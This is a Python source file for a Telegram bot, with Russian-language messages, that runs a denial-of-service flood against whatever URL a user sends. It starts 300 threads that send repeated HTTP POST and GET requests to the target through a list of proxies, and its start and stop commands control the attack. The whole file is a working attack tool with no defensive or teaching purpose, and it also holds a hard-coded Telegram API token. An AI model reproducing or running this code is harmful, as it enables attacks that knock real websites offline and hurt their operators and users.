import telebot
import requests
import threading

with open("proxy.txt") as file:
    proxy = file.read().splitlines()

def ddos():
    global url
    global on_off
    while True:
        if on_off == 1:
            for proxy_botnet in proxy:
                load_ddos = requests.post(f"{url}:443", proxies={"https": proxy_botnet}, timeout=0.3)
                load_ddos = requests.get(f"{url}:443", proxies={"https": proxy_botnet}, timeout=0.3)
        else:
            break

# Токен API к Telegram
API_TOKEN = '5942380849:AAGnrTYsbgXo8RDoWhT-gD6IOPaxSliZftM'

# Бот
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Привет! Я бот для атаки DDOS, введи команду /help')

@bot.message_handler(commands=['help'])
def help(message):
    bot.send_message(message.chat.id, 'Я поддерживаю следующие команды: /start, /help, /start_attack <ваша ссылка>, /stop_attack.\nНапример:\n/start_attack https://google.com')

@bot.message_handler(commands=['start_attack'])
def start_attack(message):
    bot.send_message(message.chat.id, 'Атака начата!')
    global on_off
    global url
    on_off = 1
    url = message.text[14:len(message.text)]
    if url[0:8] == 'https://' or url[0:7] == 'http://':
        potok = 300
        for i in range(potok):
            start_ddos = threading.Thread(target=ddos)
            start_ddos.start()
    else:
        bot.send_message(message.chat.id, "Неверная ссылка! Там должно быть https:// или http://")

@bot.message_handler(commands=['stop_attack'])
def stop_attack(message):
    bot.send_message(message.chat.id, 'Атака остановлена!')
    global on_off
    on_off = 0

bot.polling(none_stop=True)
